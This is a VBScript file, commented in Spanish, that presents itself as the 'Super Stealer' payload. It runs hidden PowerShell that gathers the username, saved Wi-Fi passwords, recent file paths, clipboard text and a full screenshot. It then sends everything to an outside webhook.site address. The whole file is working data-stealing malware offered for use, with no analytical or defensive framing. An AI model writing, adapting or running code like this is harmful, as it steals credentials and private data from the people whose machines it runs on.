' --- Payload "Super Stealer" v1.0 ---
On Error Resume Next

Dim objShell, psCommand, jsonResult

' Creamos el comando de PowerShell que hará todo el trabajo. Es un bloque de texto grande.
' Cada parte está diseñada para ser lo más silenciosa posible.
psCommand = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""try { " & _
    "$ErrorActionPreference = 'SilentlyContinue'; " & _
    "$output = @{}; " & _
    "$output.username = $env:USERNAME; " & _
    "$output.computerName = $env:COMPUTERNAME; " & _
    " " & _
    "// --- 1. Robo de Perfiles y Claves Wi-Fi --- " & _
    "$wifiProfiles = (netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $_.ToString().Split(':')[-1].Trim() }); " & _
    "$wifiData = @(); " & _
    "foreach ($profile in $wifiProfiles) { " & _
        "$keyData = (netsh wlan show profile name='$profile' key=clear | Select-String 'Key Content'); " & _
        "if ($keyData) { " & _
            "$password = $keyData.ToString().Split(':')[-1].Trim(); " & _
            "$wifiData += @{ SSID = $profile; Password = $password }; " & _
        "} " & _
    "} " & _
    "$output.wifi_credentials = $wifiData; " & _
    " " & _
    "// --- 2. Robo de Archivos Recientes (Últimos 5) --- " & _
    "$recentFiles = Get-ChildItem -Path (Join-Path $env:APPDATA 'Microsoft\Windows\Recent') -Filter *.lnk | " & _
                 "Sort-Object LastWriteTime -Descending | Select-Object -First 5 | " & _
                 "ForEach-Object { (New-Object -ComObject WScript.Shell).CreateShortcut($_.FullName).TargetPath }; " & _
    "$output.recent_files = $recentFiles; " & _
    " " & _
    "// --- 3. Robo del Contenido del Portapapeles --- " & _
    "Add-Type -AssemblyName System.Windows.Forms; " & _
    "$clipboardContent = [System.Windows.Forms.Clipboard]::GetText(); " & _
    "$output.clipboard_content = $clipboardContent; " & _
    " " & _
    "// --- 4. Captura de Pantalla --- " & _
    "$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " & _
    "$bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; " & _
    "$graphics = [System.Drawing.Graphics]::FromImage($bmp); " & _
    "$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); " & _
    "$ms = New-Object System.IO.MemoryStream; " & _
    "$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); " & _
    "$bytes = $ms.ToArray(); " & _
    "$output.screenshot_b64 = [Convert]::ToBase64String($bytes); " & _
    " " & _
    "// Convertir todo a un solo string JSON y enviarlo a la salida estándar " & _
    "return ($output | ConvertTo-Json -Compress); " & _
"} catch { return 'Error en el payload de PowerShell' }"""

' Ejecutamos el comando de PowerShell y capturamos su salida (el string JSON completo).
Set objShell = CreateObject("WScript.Shell")
Set exec = objShell.Exec(psCommand)
jsonResult = exec.StdOut.ReadAll()

' --- Exfiltración de Datos ---
' Enviamos el JSON que recibimos de PowerShell directamente a nuestro webhook.
Dim http
Set http = CreateObject("MSXML2.ServerXMLHTTP")
http.open "POST", "https://webhook.site/7fd9006c-0899-4a59-9b31-bda674f6acbc", False
http.setRequestHeader "Content-Type", "application/json; charset=UTF-8"
http.send jsonResult
